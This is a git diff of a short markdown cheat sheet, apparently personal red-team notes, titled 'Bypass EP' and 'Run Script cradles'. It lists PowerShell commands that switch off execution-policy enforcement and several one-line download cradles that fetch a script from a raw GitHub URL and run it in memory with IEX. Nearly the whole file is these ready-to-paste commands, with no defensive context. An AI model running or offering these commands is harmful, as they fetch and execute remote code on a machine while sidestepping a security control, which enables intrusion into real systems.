@@ -1,30 +1,28 @@
 # Bypass EP
 Start PowerShell from cmd.exe:
 
-powershell.exe -ep bypass
+```powershell.exe -ep bypass```
 
+If already running:
 
+```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass```
 
-OR If already running-
+```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Restricted```
 
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Restricted
-
-$Env:PSExecutionPolicyPreference = 'Bypass'
+```$Env:PSExecutionPolicyPreference = 'Bypass'```
 
 
 # Run Script cradles
 
-iex (iwr "https://raw.githubusercontent.com/conma293/mvp/main/1.ps1")
+```iex (iwr "https://raw.githubusercontent.com/conma293/mvp/main/1.ps1")```
 
-IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/conma293/mvp/main/1.ps1").Content
+```IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/conma293/mvp/main/1.ps1").Content```
 
-iex ((Invoke-WebRequest -Uri "https://raw.githubusercontent.com/conma293/mvp/main/1.ps1").Content)
 
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')
 
-IEX ((New-Object System.Net.webclient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')).content
+```IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')```
+
+```IEX ((New-Object System.Net.webclient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')).content```
 
 
 
